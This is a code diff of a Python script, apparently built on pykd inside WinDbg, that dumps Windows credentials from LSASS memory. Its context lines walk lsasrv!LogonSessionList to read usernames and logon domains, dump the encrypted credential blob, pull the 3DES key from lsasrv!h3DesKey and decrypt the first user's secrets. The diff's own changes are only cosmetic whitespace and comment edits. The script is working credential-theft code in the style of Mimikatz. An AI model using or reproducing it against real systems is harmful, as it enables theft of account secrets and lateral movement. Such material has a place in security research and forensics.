@@ -46,7 +46,6 @@ def main():
     # reload userland modules
     pykd.dbgCommand(".reload /user")
     time.sleep(time_interval)
-
     #retrieve usename and logondomain
     users_blob = pykd.dbgCommand("!list -x \"dS @$extret+0x90;dS @$extret+0xa0\" poi(lsasrv!LogonSessionList)")
     users_pretty = users_blob.split('\n\n')
@@ -62,7 +61,6 @@ def main():
     crypto_blob = (pykd.dbgCommand("!list -x \"db poi(poi(@$extret+0x108)+0x10)+0x30 L1B0\" poi(lsasrv!LogonSessionList)")).split('\n\n')
     # saves the first user's blob
     first_user_crypto  = ''.join(crypto_blob[0].split('  ')[1::2])
-
     # dump encrypted bytes of the 1st user
     first_user_crypto_neato = first_user_crypto.split('  ')[1::2]
     first_crypto = ''.join(first_user_crypto_neato) 
@@ -70,20 +68,15 @@ def main():
         first_user_crypto =  unhexlify(first_user_crypto.replace(" ", "").replace("-",""))
     except binascii.Error:
         error_log()
-        
     print("\n(*) first user's crypto")
     print(hexlify(first_user_crypto))
-
     # find 3DES key
     tripdes_key_blob = pykd.dbgCommand("db (poi(poi(lsasrv!h3DesKey)+0x10)+0x38)+4 L18")
-
-    #print tripdes_key_blob
+    # print tripdes_key_blob
     tripdes_key =  tripdes_key_blob.split('  ')[1::2][:2]
     tripdes_key =  unhexlify("".join(tripdes_key).replace(" ", "").replace("-",""))
     print("\n(*) 3des key")
     print(hexlify(tripdes_key))
-
-    #tripdes_key_hex = bytes.fromhex(tripdes_key)
     # decrypting the blob - the iv can be anything sinc CBC is not using it
     k = triple_des(tripdes_key, CBC,bytes.fromhex('deadbeefdeadbeef'))
     a = k.decrypt(first_user_crypto)  
